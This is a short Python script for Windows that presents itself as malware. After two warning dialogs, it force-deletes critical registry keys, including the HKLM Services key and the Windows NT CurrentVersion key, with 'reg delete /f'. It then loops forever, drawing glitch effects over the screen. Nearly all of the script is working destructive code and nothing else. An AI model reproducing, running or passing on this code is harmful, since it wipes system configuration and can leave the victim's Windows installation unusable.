import sys 
from win32file import * 
from win32api import *  
from win32gui import *  
from win32con import *  
from win32ui import *  


title = "! MALWAREEEE !"
description = "THIS IS MALWARE CODED BY MATTIA  " \
			  "PRESS YES TO DESTROY WINDOWS  " \
			  "Im not responsible for any damage" \
			  

if MessageBox(description, title, MB_ICONWARNING | MB_YESNO) == IDNO:
	print("ok")
	sys.exit(0)
title = "!! LAST WARNING !!"
description = "LAST WARNING DO YOU WANT RUN?!\n" \
			  

if MessageBox(description, title, MB_ICONWARNING | MB_YESNO) == IDNO:
	print("ok bro")
	sys.exit(0)



import subprocess
import win32gui
import win32api
import win32con
import random
import ctypes
subprocess.run(["reg", "delete", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion", "/f"])
subprocess.run(["reg", "delete", "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services", "/f"])
subprocess.run(["reg", "delete", "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "/f"])
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *


desk = GetDC(0)
x = 90
y = 90
x_2 = 90
y_2 = 90


for i in range(200):
    PatBlt(desk, x, y, x_2, y_2, PATINVERT)
    x += 10
    y += 10
    x_2 -= 10
    y_2 -= 10
user32 = ctypes.windll.user32
user32.SetProcessDPIAware()
[sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
while True:
    hdc = win32gui.GetDC(0)
    color = (random.randint(0, 122), random.randint(0, 430), random.randint(0, 310))
    brush = win32gui.CreateSolidBrush(win32api.RGB(*color))
    win32gui.SelectObject(hdc, brush)
    win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.SRCCOPY)
    win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.PATINVERT)
